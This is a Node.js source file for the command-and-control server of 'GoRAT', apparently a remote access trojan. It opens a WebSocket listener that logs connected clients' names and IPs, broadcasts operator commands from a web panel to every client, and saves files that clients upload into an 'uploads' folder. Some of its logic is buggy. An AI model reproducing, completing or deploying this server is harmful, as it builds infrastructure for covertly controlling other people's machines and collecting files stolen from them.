const WebSocket = require('ws');
const express = require('express'), fs = require('fs');
 
let gorat = {
  "websocketPort": 9898,
  "serverPort": 9899,
  "version": "1.1.0",
  "sep": "[<&>]",
  "ns": {
    "message": "NodeServer::Message"
  }
};

const wss = new WebSocket.Server({ port: gorat.websocketPort });

// list of users
let clients   = [];
let clientsN  = new Set();

function broadcast(message) {
  for (var j=0; j < clients.length; j++) {
      clients[j].send(message);
  }
}

wss.on('connection', function connection(ws) {
  clients.push(ws);

  ws.on('message', function incoming(message) {
    if(!message.includes("GORAT::NO_PRINT")) console.log('[MESSAGE] %s', message);

    let mSplit = message.split("[<&>]");
    if(mSplit[0] == "WebServer::Message") {
      switch(mSplit[1]) {
        case "RetrieveUsers":
          broadcast(`NodeServer::Message[<&>]RFS::Ping[<&>]ip:all`)
          setTimeout(() => {
            ws.send(`${gorat.ns.message}${gorat.sep}${JSON.stringify(clientsN)}`);
          }, 1500);
          break;
        case "Broadcast":
          if(mSplit[2] == undefined || mSplit[2].length == 0) return ws.send(`${gorat.ns.message}${gorat.sep}Invalid broadcast`)
          broadcast(`${gorat.ns.message}${gorat.sep}${mSplit.slice(2).join("[<&>]")}`)
          ws.send(`${gorat.ns.message}${gorat.sep}Broadcasted successfully`);
          break;
      }
    }
    if(mSplit[0] == "Client::Keep-Alive")  {
      ws.send("NodeServer::Keep-Alive");
    }
    if(mSplit[0] == "Client:Message") {
      switch(mSplit[1]) {
        case "HelloPing":
          clientsN.clear();
          clientsN.add({"client": { name: mSplit[3],  "ip": mSplit[2] }});
          break;
      }
    }
    if(mSplit[0] == "Client::UFile") {
      fs.writeFile(`uploads/${new Date()}${mSplit[3]}.${mSplit[1].split(":")[0]}`, mSplit[1].split(":")[1], (res, err) => {
        if(err) {
          console.log(err);
        }
      });
    }
  });


  ws.send(`${gorat.ns.message}${gorat.sep}Welcome to GoRAT (v${gorat.version}) websocket`);

});

wss.on("close", (ws) => {
  delete clients[ws];
})
console.log(`[NodeServer] Listening to ${gorat.websocketPort}`);


/*

  Web Server

*/

const app = express()
app.get('/', (req, res) => res.sendFile(__dirname + "/public/index.html"));
app.listen(gorat.serverPort, () => console.log(`[WebServer] Listening to ${gorat.serverPort}`))
